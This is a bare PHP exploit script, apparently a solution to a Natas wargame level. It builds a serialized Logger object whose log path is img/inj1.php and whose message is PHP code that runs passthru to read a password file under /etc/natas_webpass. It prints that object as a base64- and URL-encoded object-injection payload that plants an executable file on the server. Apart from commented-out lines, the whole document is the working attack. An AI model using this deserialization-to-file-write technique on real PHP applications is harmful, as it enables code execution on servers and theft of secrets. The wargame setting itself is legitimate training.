<html>
<body>
<?php

ini_set('display_errors', 'On');
error_reporting(E_ALL | E_STRICT);



class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;
      
        function __construct($file){
            // initialise variables
           $this->initMsg="";

/*           $this->exitMsg= "<?php passthru('cat /etc/natas_webpass/natas27');?>";*/
           $this->exitMsg= "<?php passthru('cat /etc/natas_webpass/natas27');?>";
/*            $this->initMsg = "INIT";
            $this->exitMsg = "EXIT";
*/

//            $this->exitMsg=$this->initMsg;
            $this->logFile = "img/inj1.php";
      
        }                       
      
        function log($msg){
           return $this->exitMsg;
        }                       
      
        function __destruct(){
        }                     
}



  
$loggy = new Logger("lol");
// var_dump($loggy);

echo serialize($loggy);

echo "\n\n\n";


echo urlencode(base64_encode(serialize($loggy)));

echo "\n\n\n";

//var_dump($loggy->log(1));
//echo $loggy->log(1);

//echo "hi";

?>


</body>
</html>
